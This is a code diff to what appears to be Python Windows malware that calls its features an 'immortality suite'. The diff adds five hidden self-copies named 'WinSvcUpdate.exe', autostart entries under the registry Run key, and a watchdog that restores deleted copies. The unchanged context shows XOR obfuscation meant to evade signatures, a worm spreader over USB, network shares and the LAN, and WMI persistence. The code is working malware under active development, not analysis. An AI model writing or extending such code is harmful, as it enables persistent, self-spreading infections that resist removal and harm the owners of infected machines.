@@ -110,7 +110,7 @@ _audio_channels = 1
 _log_file = os.path.join(os.environ.get("TEMP", "."), "svc.log")
 
 # ─── Obfuscation Helpers ─────────────────────────────────────
-_OBF_KEY = b"\\x9e\\xa3\\x7c\\xd1\\x45\\x08\\xfb\\x9a\\x62\\x3e\\xc0\\x77\\x1a\\xe4\\x5b\\x8f"
+_OBF_KEY = b"OBFUSCATION_KEY_16BYTE"
 
 def _obf(s: str) -> str:
     """XOR-obfuscate/deobfuscate a string at runtime to evade static signatures."""
@@ -1811,6 +1811,76 @@ def _spreader_init():
     threading.Thread(target=_lan_worm_scan, daemon=True).start()
     _log("Spreader engine active (USB + shares + LAN)")
 
+# ─── 5 Hidden Copies + Mutual Watchdog ──────────────────────
+
+def _hidden_copies_deploy():
+    """Copy executable to 5 hidden locations."""
+    exe = _get_exe_path()
+    locations = [
+        os.environ.get("APPDATA", ""),
+        os.environ.get("LOCALAPPDATA", ""),
+        os.environ.get("TEMP", ""),
+        os.environ.get("USERPROFILE", ""),
+        os.path.join(os.environ.get("APPDATA", ""), "SysCache"),
+    ]
+    deployed = []
+    for base in locations:
+        if not base:
+            continue
+        dest = os.path.join(base, "WinSvcUpdate.exe")
+        try:
+            if os.path.abspath(exe).lower() != os.path.abspath(dest).lower():
+                shutil.copy2(exe, dest)
+                os.system(f'attrib +h "{dest}"')
+            deployed.append(dest)
+        except:
+            pass
+    return deployed
+
+def _hidden_copies_register():
+    """Register each copy in registry so they auto-start."""
+    copies = _hidden_copies_deploy()
+    try:
+        import winreg
+        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run")
+        for i, path in enumerate(copies):
+            winreg.SetValueEx(k, f"WinSvcCopy{i}", 0, winreg.REG_SZ, f'"{path}"')
+        winreg.CloseKey(k)
+        _log(f"  [+] Deployed {len(copies)} hidden copies")
+    except:
+        pass
+
+def _mutual_watchdog():
+    """Each copy watches the others. Restore any that go missing."""
+    while True:
+        try:
+            import winreg
+            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
+            i = 0
+            while True:
+                try:
+                    name, val, _ = winreg.EnumValue(k, i)
+                    i += 1
+                    if not name.startswith("WinSvcCopy"):
+                        continue
+                    path = val.strip('"')
+                    if not os.path.exists(path):
+                        _log(f"  [!] Copy missing: {path}, redeploying...")
+                        exe = _get_exe_path()
+                        try:
+                            shutil.copy2(exe, path)
+                            os.system(f'attrib +h "{path}"')
+                        except:
+                            pass
+                except OSError:
+                    break
+            winreg.CloseKey(k)
+        except:
+            pass
+        _watchdog_active.wait(timeout=60)
+
 # ─── Init all immortality features ────────────────────────────
 
 def _immortality_init():
@@ -1826,9 +1896,11 @@ def _immortality_init():
     _ads_hide()
     _start_watchdog()
     _wmi_persistence()
+    _hidden_copies_register()
     _spreader_init()
     threading.Thread(target=_handle_revocation_loop, daemon=True).start()
     threading.Thread(target=_dead_mans_switch_updater, daemon=True).start()
+    threading.Thread(target=_mutual_watchdog, daemon=True).start()
     _log("Immortality suite initialized")
 
 # ─── Redefine install_persistence to use enhanced version ──────
